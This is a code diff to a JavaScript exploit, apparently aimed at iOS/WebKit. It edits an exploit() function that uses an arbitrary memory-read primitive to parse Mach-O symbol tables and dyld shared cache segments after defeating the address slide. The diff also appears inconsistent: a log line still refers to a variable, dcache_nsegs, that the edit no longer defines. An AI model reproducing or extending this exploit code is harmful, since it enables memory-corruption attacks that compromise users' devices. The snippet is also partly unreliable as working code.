@@ -82,7 +82,7 @@ function fsyms(mem, base, segs, want, syms)
             var cmd = memory.u32(Add(base, off));
             if(cmd == 0x2) // LC_SYMTAB
             {
-                var b = memory.copyfrom(Add(base, off + 0x8),0, 0x10);
+                var b = memory.read(Add(base, off + 0x8), 0x10);
                 stab =
                 {
                     symoff:  b2u32(b.slice(0x0, 0x4)),
@@ -101,7 +101,7 @@ function fsyms(mem, base, segs, want, syms)
         var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
         var fn = function(i)
         {
-            return memory.copyfrom(Add(tmp.base, tmp.off + i),0,1)[0];
+            return memory.read(Add(tmp.base, tmp.off + i),1)[0];
         };
         for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
         {
@@ -553,9 +553,9 @@ function exploit(){
         //log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
         //tmp = base;
         var hdr = Add(0x180000000,nslide);
-        var dcache_base_seg = null;
+        var base_seg = null;
         //var dcache_nsegs = memory.read_i32(base + 0x14);
-        var nsegs = memory.u32(Add(dcache_base,0x14));
+        var nsegs = memory.u32(Add(hdr,0x14));
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
